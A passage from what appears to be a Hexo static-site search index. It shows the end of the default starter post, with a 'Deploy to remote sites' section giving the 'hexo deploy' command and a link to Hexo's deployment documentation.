href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
